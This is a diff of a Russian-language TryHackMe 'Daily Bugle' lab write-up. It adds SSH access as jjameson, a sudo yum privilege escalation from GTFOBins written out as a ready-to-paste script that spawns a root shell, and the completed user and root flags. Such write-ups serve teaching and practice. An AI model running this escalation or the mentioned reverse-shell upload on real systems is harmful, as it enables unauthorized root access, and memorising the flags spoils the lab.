@@ -213,10 +213,10 @@ python exploit также дал имя пользователя и hash
 
 ## 📂 Получение доступа
 
-Имея логин `jonah` и пароль `spiderman123`, захожу в jommla control panel
+Имея логин `jonah` и пароль `spiderman123`, захожу в jommla control panel  
 ![jommla](screenshots/01.joomla.png)
 
-Загружаю php reverse shell
+Загружаю php reverse shell  
 ![reverse](screenshots/02.reverse.png)
 
 И получаю доступ
@@ -240,10 +240,10 @@ apache
 
 ## ⚙️ Привилегии
 
-linPEAS выдал пароль в файлах
+linPEAS выдал пароль в файлах  
 ![pass](screenshots/03.pass.png)
 
-И он подошел к ранее найденному хэшуls
+И он подошел к ранее найденному хэшу
 ```
 ┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Lin Hard - DailyBugle/exploits]
 └─$ cat hash_mysql.txt
@@ -290,12 +290,83 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-08 03:43:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-08 03:43:48
 ```
 
+И получаю доступ по ssh для jjameson
+```
+[jjameson@dailybugle ~]$ ls -la
+total 16
+drwx------. 2 jjameson jjameson  99 Dec 15  2019 .
+drwxr-xr-x. 3 root     root      22 Dec 14  2019 ..
+lrwxrwxrwx  1 jjameson jjameson   9 Dec 14  2019 .bash_history -> /dev/null
+-rw-r--r--. 1 jjameson jjameson  18 Aug  8  2019 .bash_logout
+-rw-r--r--. 1 jjameson jjameson 193 Aug  8  2019 .bash_profile
+-rw-r--r--. 1 jjameson jjameson 231 Aug  8  2019 .bashrc
+-rw-rw-r--  1 jjameson jjameson  33 Dec 15  2019 user.txt
+[jjameson@dailybugle ~]$ cat user.txt
+27a260fe3cba712cfdedb1c86d80442e
+```
 
+### sudo -l
+```
+[jjameson@dailybugle ~]$ sudo -l
+User jjameson may run the following commands on dailybugle:
+    (ALL) NOPASSWD: /usr/bin/yum
+```
+
+Эксплуатация описана тут: `https://gtfobins.github.io/gtfobins/yum/`
+В данном случае нужно это:
+```
+TF=$(mktemp -d)
+cat >$TF/x<<EOF
+[main]
+plugins=1
+pluginpath=$TF
+pluginconfpath=$TF
+EOF
+
+cat >$TF/y.conf<<EOF
+[main]
+enabled=1
+EOF
+
+cat >$TF/y.py<<EOF
+import os
+import yum
+from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
+requires_api_version='2.1'
+def init_hook(conduit):
+  os.execl('/bin/sh','/bin/sh')
+EOF
+
+sudo yum -c $TF/x --enableplugin=y
+```
+
+Но придется руками копировать и вставлять построчно - не вариант. 
+Так проще, только один раз copy-paste:
+```
+TF=$(mktemp -d) && \
+echo -e "[main]\nplugins=1\npluginpath=$TF\npluginconfpath=$TF" > "$TF/x" && \
+echo -e "[main]\nenabled=1" > "$TF/y.conf" && \
+echo -e "import os\nimport yum\nfrom yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE\nrequires_api_version='2.1'\ndef init_hook(conduit):\n  os.execl('/bin/sh','/bin/sh')" > "$TF/y.py" && \
+sudo yum -c $TF/x --enableplugin=y
+```
+
+И получаю root
+```
+[jjameson@dailybugle ~]$ TF=$(mktemp -d) && \
+> echo -e "[main]\nplugins=1\npluginpath=$TF\npluginconfpath=$TF" > "$TF/x" && \
+> echo -e "[main]\nenabled=1" > "$TF/y.conf" && \
+> echo -e "import os\nimport yum\nfrom yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE\nrequires_api_version='2.1'\ndef init_hook(conduit):\n  os.execl('/bin/sh','/bin/sh')" > "$TF/y.py" && \
+> sudo yum -c $TF/x --enableplugin=y
+Loaded plugins: y
+No plugin match for: y
+sh-4.2# id
+uid=0(root) gid=0(root) groups=0(root)
+```
 
 ## 🏁 Флаги
 
-- User flag: 
-- Root flag: 
+- User flag: 27a260fe3cba712cfdedb1c86d80442e 
+- Root flag: eec3d53292b1821868266858d7fa6f79 
 
 ---
 
